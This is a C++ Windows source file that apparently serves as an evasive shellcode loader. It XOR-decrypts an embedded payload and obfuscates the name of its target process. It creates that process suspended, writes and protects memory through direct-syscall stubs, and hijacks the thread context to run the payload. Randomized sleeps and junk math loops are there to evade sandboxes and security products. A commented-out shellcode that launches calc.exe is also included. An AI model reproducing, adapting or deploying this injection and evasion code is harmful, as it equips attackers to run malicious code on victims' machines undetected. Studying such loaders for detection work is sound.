#include <Windows.h>
#include "tar6.7syscalls.h"
#include <iostream>
#include <vector>
#include <cstring>
#include <string>
#include <cmath>
#include <chrono>
#include <thread>
#include <random>
#include <iomanip>






void JitterSleep(int baseSeconds, double jitterPercent) {
    std::random_device rd;
    std::mt19937 gen(rd());

    double maxJitter = baseSeconds * jitterPercent;
    std::uniform_real_distribution<double> dis(-maxJitter, maxJitter);
    double finalSeconds = baseSeconds + dis(gen);

    if (finalSeconds < 0) finalSeconds = 0;
    std::this_thread::sleep_for(std::chrono::duration<double>(finalSeconds));
}

void trigStuff(int iterations) {
    volatile double dummyValue = 0.0;

    for (int i = 0; i < iterations; ++i) {
        double angle = static_cast<double>(i) * 0.01;
        dummyValue += std::sin(angle) * std::cos(angle) + std::sqrt(std::abs(angle));
    }
    (void)dummyValue;
}


std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return L"";


    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);


    std::wstring wstrTo(size_needed, 0);


    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);

    return wstrTo;
}


const unsigned char DECRYPTION_KEY = 0x5A;


std::vector<int> notepad = { 28, 67, 65, 48, 8, 13, 3, 14, 22, 18, 65, 44, 24, 18, 19, 4, 12, 56, 55, 65, 13, 14, 19, 4, 15, 0, 3, 52, 4, 23, 4 };


const std::vector<unsigned char> encrypted_alphabet = {
    0x3B, 0x38, 0x39, 0x3E, 0x3F, 0x3C, 0x3D, 0x32, 0x33, 0x30, 0x31, 0x36, 0x37, 0x34, 0x35, 0x2A,
    0x2B, 0x28, 0x29, 0x2E, 0x2F, 0x2C, 0x2D, 0x22, 0x23, 0x20, 0x1B, 0x18, 0x19, 0x1E, 0x1F, 0x1C,
    0x1D, 0x12, 0x13, 0x10, 0x11, 0x16, 0x17, 0x14, 0x15, 0x0A, 0x0B, 0x08, 0x09, 0x0E, 0x0F, 0x0C,
    0x0D, 0x02, 0x03, 0x00, 0x74, 0x05, 0x6B, 0x68, 0x69, 0x6E, 0x6F, 0x6C, 0x6D, 0x62, 0x63, 0x6A,
    0x7A, 0x06, 0x77, 0x60, 0x67, 0x61, 0x78, 0x7D, 0x7E, 0x72, 0x73, 0x01, 0x07, 0x21, 0x27, 0x66,
    0x64, 0x75, 0x76, 0x7B, 0x65, 0x71, 0x70, 0x7C, 0x26
};

const wchar_t xor_key = 0x5A;


const std::vector<wchar_t> encrypted_alphabetW = {
    0x003B, 0x0038, 0x0039, 0x003E, 0x003F, 0x003C, 0x003D, 0x0032, 0x0033,
    0x0030, 0x0031, 0x0036, 0x0037, 0x0034, 0x0035, 0x002A, 0x002B, 0x0028,
    0x0029, 0x002E, 0x002F, 0x002C, 0x002D, 0x0022, 0x0023, 0x0020, 0x001B,
    0x0018, 0x0019, 0x001E, 0x001F, 0x001C, 0x001D, 0x0012, 0x0013, 0x0010,
    0x0011, 0x0016, 0x0017, 0x0014, 0x0015, 0x000A, 0x000B, 0x0008, 0x0009,
    0x000E, 0x000F, 0x000C, 0x000D, 0x0002, 0x0003, 0x0000, 0x0074, 0x0005,
    0x006B, 0x0068, 0x0069, 0x006E, 0x006F, 0x006C, 0x006D, 0x0062, 0x0063,
    0x006A, 0x007A, 0x0006, 0x0077, 0x0060, 0x0067, 0x0061, 0x0078, 0x007D,
    0x007E, 0x0072, 0x0073, 0x0001, 0x0007, 0x0021, 0x0027, 0x0066, 0x0064,
    0x0075, 0x0076, 0x007B, 0x0065, 0x0071, 0x0070, 0x007C, 0x0026
};


std::string decryptVector(const std::vector<unsigned char>& encryptedData, unsigned char key) {
    std::string decryptedString = "";
    decryptedString.reserve(encryptedData.size());

    for (unsigned char byte : encryptedData) {
        decryptedString += static_cast<char>(byte ^ key);
    }

    return decryptedString;
}


std::vector<int> obfuscate(char* alpha, char* word) {
    std::vector<int> result;
    for (int i = 0; i < strlen(word); i++) {
        for (int d = 0; d < strlen(alpha); d++) {
            if (alpha[d] == word[i]) {
                result.push_back(d);
            }
        }
    }
    return result;
}

std::string orgStr(char* alpha, std::vector<int> obj) {
    std::string str;
    for (int i = 0; i < obj.size(); i++) {
        for (size_t d = 0; d < strlen(alpha); d++) {
            if (d == obj[i]) {
                str += alpha[d];
            }
        }
    }
    return str;
}

std::wstring orgStrW(const wchar_t* alpha, std::vector<int> obj) {
    std::wstring str;
    for (int i = 0; i < obj.size(); i++) {
        for (size_t d = 0; d < wcslen(alpha); d++) {
            if (d == obj[i]) {
                str += alpha[d];
            }
        }
    }
    return str;
}

void XorProcess(std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % key.size()];
    }
}

std::string alpha = decryptVector(encrypted_alphabet, DECRYPTION_KEY);
char* alphabet = &alpha[0];

int main() {

    std::wstring alphabetW;
    alphabetW.reserve(encrypted_alphabetW.size());

    for (wchar_t ch : encrypted_alphabetW) {
        alphabetW.push_back(ch ^ xor_key);
    }

    MessageBox(NULL, L"stage 1 ", L"Box Title", MB_OK | MB_ICONINFORMATION);

    /*unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";*/

    const std::vector<unsigned char> encryptedPayload = {
    0x59, 0x12, 0x9c, 0x15, 0xcc, 0x2b, 0x65, 0x5a, 0x1f, 0xf1, 0x7d, 0x92,
    0xe4, 0x0a, 0x4d, 0xa0, 0x6a, 0x8b, 0x94, 0x88, 0x7a, 0xb9, 0xb7, 0x91,
    0xc5, 0x12, 0x94, 0xa3, 0x24, 0x8b, 0x2e, 0x08, 0x3f, 0xb9, 0xb7, 0xb1,
    0xf5, 0x12, 0x10, 0x46, 0x76, 0x89, 0xe8, 0x6b, 0xd6, 0xb9, 0x0d, 0x03,
    0x09, 0x66, 0x7e, 0x8d, 0x3e, 0xef, 0x85, 0x1b, 0xde, 0x38, 0x31, 0x82,
    0xa4, 0x9b, 0xfd, 0x1c, 0x6e, 0x82, 0xf4, 0x12, 0x94, 0xa3, 0x1c, 0x48,
    0xe7, 0x66, 0x57, 0xf0, 0xec, 0x48, 0x25, 0xd2, 0x1f, 0xf1, 0x3c, 0x8b,
    0x20, 0x9a, 0x6b, 0x96, 0x74, 0xc2, 0x75, 0x0a, 0x94, 0xb9, 0x24, 0x87,
    0x2e, 0x1a, 0x3f, 0xb8, 0x3d, 0x13, 0x46, 0x0c, 0x57, 0x0e, 0xf5, 0x82,
    0x2e, 0x6e, 0x97, 0xb9, 0x3d, 0x15, 0xe8, 0x6b, 0xd6, 0xb9, 0x0d, 0x03,
    0x09, 0x1b, 0xde, 0x38, 0x31, 0x82, 0xa4, 0x9b, 0x27, 0x11, 0x49, 0x32,
    0xe9, 0x59, 0x53, 0xd5, 0x34, 0x86, 0x9c, 0x8b, 0x6a, 0x29, 0x64, 0x87,
    0x2e, 0x1a, 0x3b, 0xb8, 0x3d, 0x13, 0xc3, 0x1b, 0x94, 0xfd, 0x74, 0x87,
    0x2e, 0x1a, 0x03, 0xb8, 0x3d, 0x13, 0xe4, 0xd1, 0x1b, 0x79, 0x74, 0xc2,
    0x75, 0x1b, 0x47, 0xb0, 0x64, 0x9d, 0xfc, 0x00, 0x5e, 0xa9, 0x7d, 0x9a,
    0xe4, 0x00, 0x57, 0x72, 0xd0, 0xe3, 0xe4, 0x08, 0xe0, 0x11, 0x64, 0x82,
    0xfc, 0x00, 0x57, 0x7a, 0x2e, 0x2a, 0xf2, 0xa5, 0xe0, 0x0e, 0x61, 0x8b,
    0x1f, 0x5b, 0x1f, 0xf1, 0x3c, 0xc3, 0xa5, 0x5a, 0x1f, 0xb9, 0xb1, 0x4e,
    0xa4, 0x5b, 0x1f, 0xf1, 0x7d, 0x79, 0x94, 0xd1, 0x70, 0x76, 0xc3, 0x16,
    0x1e, 0xba, 0x02, 0xdb, 0x36, 0x82, 0x1f, 0xfc, 0x8a, 0x4c, 0xa1, 0x3c,
    0x70, 0x12, 0x9c, 0x35, 0x14, 0xff, 0xa3, 0x26, 0x15, 0x71, 0xc7, 0x23,
    0xd0, 0x5f, 0xa4, 0xb6, 0x2f, 0xb1, 0xca, 0x30, 0x1f, 0xa8, 0x7d, 0x4a,
    0x7f, 0xa5, 0xca, 0x92, 0x5d, 0xaf, 0xc6, 0x74, 0x7a, 0x89, 0x59, 0xc3
    };
    /*const std::vector<unsigned char> encryptedPayload = {
        0x59
    };*/

    
    std::vector<unsigned char> temp = encryptedPayload;
    std::vector<unsigned char> key = { 0xA5, 0x5A, 0x1F, 0xF1, 0x3C, 0xC3 };
	XorProcess(temp, key);
	unsigned char* shellcode = temp.data();
    JitterSleep(10, 0.8);
    SIZE_T shellcodeSize = temp.size();

    std::wstring targetPath = StringToWString(orgStr(alphabet, notepad));

    HANDLE hProcess, hThread;

    JitterSleep(4, 0.3);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    trigStuff(1200);
    hProcess = pi.hProcess;
    hThread = pi.hThread;
    JitterSleep(7, 0.8);
    trigStuff(1040);
    PVOID newBase = 0;
    SIZE_T regionSize = shellcodeSize + 0x1000;
    Sw3NtAllocateVirtualMemory(hProcess, &newBase, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    JitterSleep(7, 0.8);
    trigStuff(1005);
    SIZE_T bytesWritten = 0;
    Sw3NtWriteVirtualMemory(hProcess, newBase, (PVOID)shellcode, shellcodeSize, &bytesWritten);

    JitterSleep(2, 0.8);
    ULONG oldProtection = 0;

    PVOID protectBase = newBase;
    SIZE_T protectSize = regionSize;
	Sw3NtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtection);

    trigStuff(3000);

    __declspec(align(16)) CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_CONTROL;
    JitterSleep(3, 0.4);
    NTSTATUS status;
    status = Sw3NtGetContextThread(hThread, &ctx);
    if (status != 0) {
        TerminateProcess(hProcess, 0);
        return -2;
    }


#ifdef _WIN64
    ctx.Rip = (DWORD64)newBase;
#else
    ctx.Eip = (DWORD)newBase;
#endif
    status = Sw3NtSetContextThread(hThread, &ctx);
    if (status != 0) {
        TerminateProcess(hProcess, 0);
        return -3;
    }
    JitterSleep(5, 0.3);
    trigStuff(1020);
    ULONG suspendCount = 0;
    Sw3NtResumeThread(hThread, &suspendCount);
    Sw3NtClose(hThread);
    Sw3NtClose(hProcess);
    return 0;
}

























